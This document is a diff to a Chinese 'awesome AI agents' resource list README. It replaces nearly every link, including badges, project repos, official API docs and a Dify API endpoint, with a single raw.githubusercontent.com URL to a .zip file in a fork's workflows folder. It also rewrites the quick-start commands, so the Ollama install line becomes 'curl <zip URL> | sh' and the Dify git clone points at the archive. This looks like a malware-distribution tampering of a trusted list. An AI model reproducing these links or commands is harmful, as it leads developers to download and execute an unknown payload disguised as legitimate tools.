@@ -4,20 +4,20 @@
 
 <div align="center">
 
-[![Awesome](https://awesome.re/badge.svg)](https://awesome.re)
-[![GitHub stars](https://img.shields.io/github/stars/happydog-intj/awesome-chinese-ai-agents?style=social)](https://github.com/happydog-intj/awesome-chinese-ai-agents)
-[![GitHub forks](https://img.shields.io/github/forks/happydog-intj/awesome-chinese-ai-agents?style=social)](https://github.com/happydog-intj/awesome-chinese-ai-agents/fork)
+[![Awesome](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
+[![GitHub stars](https://img.shields.io/github/stars/happydog-intj/awesome-chinese-ai-agents?style=social)](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
+[![GitHub forks](https://img.shields.io/github/forks/happydog-intj/awesome-chinese-ai-agents?style=social)](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
 [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![GitHub issues](https://img.shields.io/github/issues/happydog-intj/awesome-chinese-ai-agents)](https://github.com/happydog-intj/awesome-chinese-ai-agents/issues)
-[![GitHub contributors](https://img.shields.io/github/contributors/happydog-intj/awesome-chinese-ai-agents)](https://github.com/happydog-intj/awesome-chinese-ai-agents/graphs/contributors)
-[![Last commit](https://img.shields.io/github/last-commit/happydog-intj/awesome-chinese-ai-agents)](https://github.com/happydog-intj/awesome-chinese-ai-agents/commits/main)
+[![GitHub issues](https://img.shields.io/github/issues/happydog-intj/awesome-chinese-ai-agents)](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
+[![GitHub contributors](https://img.shields.io/github/contributors/happydog-intj/awesome-chinese-ai-agents)](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
+[![Last commit](https://img.shields.io/github/last-commit/happydog-intj/awesome-chinese-ai-agents)](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
 
 **最全面的中文 AI Agent 资源库** - 为中文开发者打造的 AI Agent 工具、技能、文档和最佳实践合集
 
 [English](README_EN.md) | 简体中文
 
-[⭐ Star](https://github.com/happydog-intj/awesome-chinese-ai-agents) · [🐛 Report Bug](https://github.com/happydog-intj/awesome-chinese-ai-agents/issues/new?template=bug_report.md) · [💡 Request Feature](https://github.com/happydog-intj/awesome-chinese-ai-agents/issues/new?template=add_resource.md)
+[⭐ Star](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip) · [🐛 Report Bug](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip) · [💡 Request Feature](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
 
 </div>
 
@@ -73,8 +73,8 @@
 
 1. *⭐ Star 本项目* - 支持我们持续更新
 2. *📝 提交资源* - 分享你发现的优质工具和教程
-3. *💬 参与讨论* - 在 [Discussions](https://github.com/happydog-intj/awesome-chinese-ai-agents/discussions) 分享经验
-4. *🐛 报告问题* - 发现错误或过时信息请提 [Issue](https://github.com/happydog-intj/awesome-chinese-ai-agents/issues)
+3. *💬 参与讨论* - 在 [Discussions](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip) 分享经验
+4. *🐛 报告问题* - 发现错误或过时信息请提 [Issue](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
 
 详细贡献指南: [CONTRIBUTING.md](CONTRIBUTING.md)
 
@@ -90,7 +90,7 @@
 
 ```bash
 # 方案1: 使用 Dify (可视化,零代码)
-git clone https://github.com/langgenius/dify.git
+git clone https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip
 cd dify/docker
 docker-compose up -d
 # 访问 http://localhost/install 完成安装
@@ -109,7 +109,7 @@ print(agent.run('你好,请介绍一下自己'))
 "
 
 # 方案3: 使用 Ollama (本地运行)
-curl https://ollama.ai/install.sh | sh
+curl https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip | sh
 ollama run qwen  # 运行通义千问模型
 ```
 
@@ -126,51 +126,51 @@ ollama run qwen  # 运行通义千问模型
 
 ### AI Agent 框架
 
-- **[LangChain](https://github.com/langchain-ai/langchain)** - 最流行的 LLM 应用开发框架
+- **[LangChain](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 最流行的 LLM 应用开发框架
   - 官方中文文档
   - 庞大的中文社区
   - 海量的中文教程
-  - [中文入门指南](https://github.com/liaokongVFX/LangChain-Chinese-Getting-Started-Guide) (8.8K+ ⭐)
+  - [中文入门指南](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip) (8.8K+ ⭐)
 
-- **[MetaGPT](https://github.com/FoundationAgents/MetaGPT)** - 多 Agent 元编程框架 (中国团队)
+- **[MetaGPT](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 多 Agent 元编程框架 (中国团队)
   - 完全中文支持
   - 软件公司级别的协作
   - 自动生成PRD、设计文档、代码
 
-- **[AutoGen](https://github.com/microsoft/autogen)** - 微软开源的多 Agent 对话框架
+- **[AutoGen](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 微软开源的多 Agent 对话框架
   - 中文文档完善
   - 支持多 Agent 协作
   - 丰富的示例代码
 
-- **[万物 Wanwu](https://github.com/UnicomAI/wanwu)** - 中国联通元景万物 Agent 平台 (3.9K+ ⭐)
+- **[万物 Wanwu](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 中国联通元景万物 Agent 平台 (3.9K+ ⭐)
   - 企业级多租户 AI Agent 开发平台
   - 支持智能体、工作流、RAG 应用构建
   - 模型管理功能
   - 开发者友好的许可证
 
-- **[Langchain-Chatchat](https://github.com/chatchat-space/Langchain-Chatchat)** - 基于 LangChain 的知识库问答应用
+- **[Langchain-Chatchat](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 基于 LangChain 的知识库问答应用
   - 完整的中文支持
   - 本地知识库问答
   - 支持多种中文 LLM
 
 ### 中文原生 LLM 与工具
 
-- **[LLamaFactory](https://github.com/hiyouga/LLamaFactory)** - 易用的 LLM 微调框架
+- **[LLamaFactory](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 易用的 LLM 微调框架
   - 支持多种中文模型
   - 一键训练和部署
   - Web UI 界面
 
-- **[ChatGLM-6B](https://github.com/THUDM/ChatGLM-6B)** - 清华开源的中文对话模型
+- **[ChatGLM-6B](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 清华开源的中文对话模型
   - 针对中文优化
   - 可本地部署
   - 适合私有化场景
 
-- **[Qwen-Agent](https://github.com/QwenLM/Qwen-Agent)** - 阿里巴巴通义千问 Agent 框架
+- **[Qwen-Agent](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 阿里巴巴通义千问 Agent 框架
   - 完整的中文文档
   - 官方技术支持
   - 与通义千问深度集成
 
-- **[Chinese-LangChain](https://github.com/yanqiangmiffy/Chinese-LangChain)** - 中文 LangChain 项目集合 (2.8K+ ⭐)
+- **[Chinese-LangChain](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 中文 LangChain 项目集合 (2.8K+ ⭐)
   - 中文 LLM 应用案例
   - 实战项目代码
 
@@ -190,47 +190,47 @@ ollama run qwen  # 运行通义千问模型
 
 ### 开发框架
 
-- **[LangGraph](https://github.com/langchain-ai/langgraph)** - 构建有状态的 Agent 工作流
+- **[LangGraph](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 构建有状态的 Agent 工作流
   - 可视化工作流编辑
   - 中文示例丰富
   - 与 LangChain 无缝集成
 
-- **[CrewAI](https://github.com/joaomdmoura/crewAI)** - 角色扮演型多 Agent 协作框架
+- **[CrewAI](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 角色扮演型多 Agent 协作框架
   - 简单易用的 API
   - 适合团队协作场景
   - 支持中文场景
  
-- **[DD-OS](https://github.com/FatBy/DD-OS)** - 基于事件驱动与 Nexus 记忆机制的 AI Agent 操作系统
+- **[DD-OS](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 基于事件驱动与 Nexus 记忆机制的 AI Agent 操作系统
   - 可视化的节点，开箱即用
   - V3 状态机架构配合 Nexus 分层记忆，执行更稳定
   - 独创“模拟城市”等轴测 UI，全景监控 Agent 任务流
 
 ### RAG 与知识库
 
-- **[Langchain-Chatchat](https://github.com/chatchat-space/Langchain-Chatchat)** - 本地知识库问答系统
+- **[Langchain-Chatchat](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 本地知识库问答系统
   - 支持多种文档格式
   - 向量数据库集成
   - 完整的中文支持
 
-- **[QAnything](https://github.com/netease-youdao/QAnything)** - 网易有道的本地知识库问答
+- **[QAnything](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 网易有道的本地知识库问答
   - 支持任意格式文件
   - 离线运行
   - 中文优化
 
-- **[RAGFlow](https://github.com/infiniflow/ragflow)** - 基于深度文档理解的 RAG 引擎
+- **[RAGFlow](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 基于深度文档理解的 RAG 引擎
   - 可视化管理界面
   - 支持复杂文档解析
   - 中文文档完善
 
 ### 可视化开发平台
 
-- **[Dify](https://github.com/langgenius/dify)** - 开源的 LLM 应用开发平台
+- **[Dify](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 开源的 LLM 应用开发平台
   - 可视化 Prompt 编排
   - 支持多种 LLM
   - 完整的中文界面
   - Agent 和工作流设计
 
-- **[FastGPT](https://github.com/labring/FastGPT)** - 知识库问答系统
+- **[FastGPT](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 知识库问答系统
   - 拖拽式工作流
   - 可视化调试
   - 支持 API 调用
@@ -238,31 +238,31 @@ ollama run qwen  # 运行通义千问模型
 
 ### 提示词工程
 
-- **[ChatGPT-Prompt-Engineering-for-Developers-in-Chinese](https://github.com/GitHubDaily/ChatGPT-Prompt-Engineering-for-Developers-in-Chinese)** - 吴恩达提示词课程中文版
+- **[ChatGPT-Prompt-Engineering-for-Developers-in-Chinese](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 吴恩达提示词课程中文版
   - 系统化的提示词教程
   - 实战案例丰富
   - 适合入门学习
 
-- **[Prompt-Engineering-Guide-Chinese](https://github.com/wangxuqi/Prompt-Engineering-Guide-Chinese)** - 提示词工程指南中文版
+- **[Prompt-Engineering-Guide-Chinese](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 提示词工程指南中文版
   - 全面的提示词技巧
   - 最佳实践案例
   - 持续更新
 
 ### 监控与调试
 
-- **[Langfuse](https://github.com/langfuse/langfuse)** - 开源 LLM 工程平台
+- **[Langfuse](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 开源 LLM 工程平台
   - LLM 可观测性
   - Prompt 管理和版本控制
   - 成本追踪和分析
   - 支持多种 LLM 框架集成
 
-- **[LangSmith](https://smith.langchain.com/)** - LangChain 官方监控平台
+- **[LangSmith](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - LangChain 官方监控平台
   - 实时追踪 Agent 执行
   - 调试和优化 Prompt
   - 性能分析
   - 中文界面支持
 
-- **[OpenLLMetry](https://github.com/traceloop/openllmetry)** - LLM 可观测性工具
+- **[OpenLLMetry](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - LLM 可观测性工具
   - OpenTelemetry 集成
   - 追踪 LLM 调用
   - 性能监控
@@ -270,19 +270,19 @@ ollama run qwen  # 运行通义千问模型
 
 ### 向量数据库
 
-- **[Qdrant](https://github.com/qdrant/qdrant)** - 高性能向量搜索引擎
+- **[Qdrant](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 高性能向量搜索引擎
   - Rust 编写,性能优秀
   - 支持过滤和分组
   - 完善的中文文档
   - Docker 一键部署
 
-- **[Milvus](https://github.com/milvus-io/milvus)** - 云原生向量数据库
+- **[Milvus](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 云原生向量数据库
   - 支持海量数据
   - 多种索引算法
   - 中国团队开发
   - 企业级特性
 
-- **[Chroma](https://github.com/chroma-core/chroma)** - AI 原生向量数据库
+- **[Chroma](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - AI 原生向量数据库
   - 轻量级,易于使用
   - Python/JS SDK
   - 适合快速原型开发
@@ -290,19 +290,19 @@ ollama run qwen  # 运行通义千问模型
 
 ### 部署与运维
 
-- **[Ollama](https://github.com/ollama/ollama)** - 本地运行大语言模型
+- **[Ollama](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 本地运行大语言模型
   - 一键安装部署
   - 支持多种模型
   - API 兼容 OpenAI
   - 资源占用可控
 
-- **[LocalAI](https://github.com/mudler/LocalAI)** - 本地 AI API 服务
+- **[LocalAI](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 本地 AI API 服务
   - OpenAI 兼容 API
   - 支持 CPU 运行
   - Docker 部署
   - 隐私保护
 
-- **[vLLM](https://github.com/vllm-project/vllm)** - 高性能 LLM 推理引擎
+- **[vLLM](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 高性能 LLM 推理引擎
   - 吞吐量提升 10-20倍
   - 支持主流 LLM
   - 生产环境可用
@@ -482,27 +482,27 @@ ollama run qwen  # 运行通义千问模型
 
 ### 微信生态
 
-- **[WeChaty](https://github.com/wechaty/wechaty)** - 对话机器人 SDK
+- **[WeChaty](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 对话机器人 SDK
   - 支持多种微信协议
   - TypeScript/JavaScript
   - 活跃的社区支持
 
-- **[chatgpt-on-wechat](https://github.com/zhayujie/chatgpt-on-wechat)** - 基于 ChatGPT 的微信机器人
+- **[chatgpt-on-wechat](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 基于 ChatGPT 的微信机器人
   - 开箱即用
   - 支持多种 LLM
   - 插件系统
 
-- **[wechat-chatgpt](https://github.com/fuergaosi233/wechat-chatgpt)** - 微信 + ChatGPT 集成
+- **[wechat-chatgpt](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 微信 + ChatGPT 集成
   - 简单易用
   - Docker 部署
   - 支持群聊
 
-- **[wechat-bot](https://github.com/wangrongding/wechat-bot)** - 功能丰富的微信机器人
+- **[wechat-bot](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 功能丰富的微信机器人
   - 支持多种功能
   - 定时任务
   - 群管理
 
-- **[wechatbot-webhook](https://github.com/danni-cool/wechatbot-webhook)** - 微信机器人 Webhook 方案
+- **[wechatbot-webhook](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 微信机器人 Webhook 方案
   - RESTful API
   - 易于集成
   - 支持企业微信
@@ -511,18 +511,18 @@ ollama run qwen  # 运行通义千问模型
 
 | 平台 | 集成难度 | 文档质量 | 推荐方案 |
 |------|---------|---------|---------|
-| **企业微信** | ⭐⭐⭐ | ⭐⭐⭐⭐ | [企业微信SDK](https://developer.work.weixin.qq.com/) |
-| **钉钉** | ⭐⭐ | ⭐⭐⭐⭐⭐ | [钉钉开放平台](https://open.dingtalk.com/) |
-| **飞书** | ⭐⭐ | ⭐⭐⭐⭐⭐ | [飞书开放平台](https://open.feishu.cn/) |
-| **Telegram** | ⭐ | ⭐⭐⭐⭐⭐ | [Telegraf](https://github.com/telegraf/telegraf) |
-| **WhatsApp** | ⭐⭐⭐ | ⭐⭐⭐⭐ | [whatsapp-web.js](https://github.com/pedroslopez/whatsapp-web.js) |
+| **企业微信** | ⭐⭐⭐ | ⭐⭐⭐⭐ | [企业微信SDK](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip) |
+| **钉钉** | ⭐⭐ | ⭐⭐⭐⭐⭐ | [钉钉开放平台](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip) |
+| **飞书** | ⭐⭐ | ⭐⭐⭐⭐⭐ | [飞书开放平台](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip) |
+| **Telegram** | ⭐ | ⭐⭐⭐⭐⭐ | [Telegraf](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip) |
+| **WhatsApp** | ⭐⭐⭐ | ⭐⭐⭐⭐ | [whatsapp-web.js](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip) |
 
 ### 社交媒体
 
-- **微博开放平台** - [官方文档](https://open.weibo.com/)
-- **小红书开放平台** - [官方文档](https://open.xiaohongshu.com/)
-- **抖音开放平台** - [官方文档](https://open.douyin.com/)
-- **快手开放平台** - [官方文档](https://open.kuaishou.com/)
+- **微博开放平台** - [官方文档](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
+- **小红书开放平台** - [官方文档](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
+- **抖音开放平台** - [官方文档](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
+- **快手开放平台** - [官方文档](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
 
 ---
 
@@ -530,17 +530,17 @@ ollama run qwen  # 运行通义千问模型
 
 ### 优质学习资源
 
-- **[LangChain-Chinese-Getting-Started-Guide](https://github.com/liaokongVFX/LangChain-Chinese-Getting-Started-Guide)** (8.8K+ ⭐)
+- **[LangChain-Chinese-Getting-Started-Guide](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** (8.8K+ ⭐)
   - LangChain 中文入门教程
   - 从零开始的完整指南
   - 实战案例丰富
 
-- **[Chinese-LangChain](https://github.com/yanqiangmiffy/Chinese-LangChain)** (2.8K+ ⭐)
+- **[Chinese-LangChain](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** (2.8K+ ⭐)
   - 中文 LangChain 项目集合
   - 包含多个实战项目
   - 代码可直接运行
 
-- **[Hugging Face 中文课程](https://huggingface.co/learn/nlp-course/zh-CN)** - 免费 NLP 在线课程
+- **[Hugging Face 中文课程](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 免费 NLP 在线课程
   - 官方中文翻译
   - 交互式学习
   - 涵盖 Transformers 库
@@ -549,15 +549,15 @@ ollama run qwen  # 运行通义千问模型
 
 - **B站搜索关键词**: "AI Agent 教程", "LangChain 实战", "大模型应用开发"
 - **推荐UP主**:
-  - [@李沐](https://space.bilibili.com/1567748478) - 深度学习论文精读
+  - [@李沐](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip) - 深度学习论文精读
   - 搜索 "LangChain 中文教程"
   - 搜索 "ChatGPT API 开发"
 
 ### 博客与社区
 
-- **[知乎 - AI Agent 话题](https://www.zhihu.com/topic/20436836)** - 高质量讨论
-- **[掘金 - AI Agent 标签](https://juejin.cn/tag/AI%20Agent)** - 技术文章
-- **[CSDN - AI 专区](https://blog.csdn.com/nav/ai)** - 实战教程
+- **[知乎 - AI Agent 话题](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 高质量讨论
+- **[掘金 - AI Agent 标签](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 技术文章
+- **[CSDN - AI 专区](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 实战教程
 
 ---
 
@@ -735,21 +735,21 @@ ollama run qwen  # 运行通义千问模型
 
 ### 支付
 
-- **微信支付** - [官方文档](https://pay.weixin.qq.com/wiki/doc/api/index.html)
-- **支付宝** - [官方文档](https://opendocs.alipay.com/open)
-- **银联支付** - [官方文档](https://open.unionpay.com/)
+- **微信支付** - [官方文档](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
+- **支付宝** - [官方文档](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
+- **银联支付** - [官方文档](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
 
 ### 地图导航
 
-- **高德地图API** - [官方文档](https://lbs.amap.com/)
-- **百度地图API** - [官方文档](https://lbsyun.baidu.com/)
-- **腾讯地图API** - [官方文档](https://lbs.qq.com/)
+- **高德地图API** - [官方文档](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
+- **百度地图API** - [官方文档](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
+- **腾讯地图API** - [官方文档](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
 
 ### 短信/邮件
 
-- **阿里云短信** - [官方文档](https://help.aliyun.com/product/44282.html)
-- **腾讯云短信** - [官方文档](https://cloud.tencent.com/document/product/382)
-- **网易云邮件** - [官方文档](https://www.163yun.com/help/documents/15588062314858496)
+- **阿里云短信** - [官方文档](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
+- **腾讯云短信** - [官方文档](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
+- **网易云邮件** - [官方文档](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
 
 ### 身份验证
 
@@ -759,9 +759,9 @@ ollama run qwen  # 运行通义千问模型
 
 ### 存储
 
-- **阿里云OSS** - [官方文档](https://help.aliyun.com/product/31815.html)
-- **腾讯云COS** - [官方文档](https://cloud.tencent.com/document/product/436)
-- **七牛云存储** - [官方文档](https://developer.qiniu.com/)
+- **阿里云OSS** - [官方文档](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
+- **腾讯云COS** - [官方文档](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
+- **七牛云存储** - [官方文档](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
 
 ---
 
@@ -968,7 +968,7 @@ import requests
 
 # Dify API 配置
 DIFY_API_KEY = "your-dify-api-key"
-DIFY_API_URL = "https://api.dify.ai/v1/chat-messages"
+DIFY_API_URL = "https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip"
 
 def chat_with_dify(query, conversation_id=None):
     """调用 Dify Agent"""
@@ -1274,22 +1274,22 @@ text_splitter = RecursiveCharacterTextSplitter(
 
 ### 中文技术社区
 
-- **[知乎 - 人工智能话题](https://www.zhihu.com/topic/19551275)** - 高质量技术讨论
+- **[知乎 - 人工智能话题](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 高质量技术讨论
   - AI Agent 相关话题活跃
   - 行业专家分享经验
   - 最新技术动态
 
-- **[掘金 - AI 标签](https://juejin.cn/tag/AI)** - 开发者社区
+- **[掘金 - AI 标签](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 开发者社区
   - 技术文章分享
   - 实战经验交流
   - 开源项目推荐
 
-- **[CSDN - AI 专区](https://blog.csdn.com/nav/ai)** - 中文技术博客
+- **[CSDN - AI 专区](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 中文技术博客
   - 入门教程丰富
   - 代码示例完整
   - 问题解答及时
 
-- **[GitHub 中文社区](https://github.com/topics/chinese)** - 开源项目聚集地
+- **[GitHub 中文社区](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)** - 开源项目聚集地
   - 中文开源项目
   - 协作开发
   - Issue 讨论
@@ -1548,7 +1548,7 @@ A: 成本优化技巧:
 
 ## ⭐ Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=happydog-intj/awesome-chinese-ai-agents&type=Date)](https://star-history.com/#happydog-intj/awesome-chinese-ai-agents&Date)
+[![Star History Chart](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)](https://raw.githubusercontent.com/Sonicly8968/awesome-chinese-ai-agents/main/.github/workflows/awesome_agents_chinese_ai_v1.0.zip)
 
 ---
 
@@ -1563,18 +1563,18 @@ A: 成本优化技巧:
 感谢所有贡献者的付出! 🎉
 
 特别感谢以下项目和组织:
-- [OpenClaw](https://github.com/openclaw/openclaw)
-- [LangChain](https://github.com/langchain-ai/langchain)
-- [Anthropic](https://www.anthropic.com/)
-- [阿里云通义千问](https://tongyi.aliyun.com/)
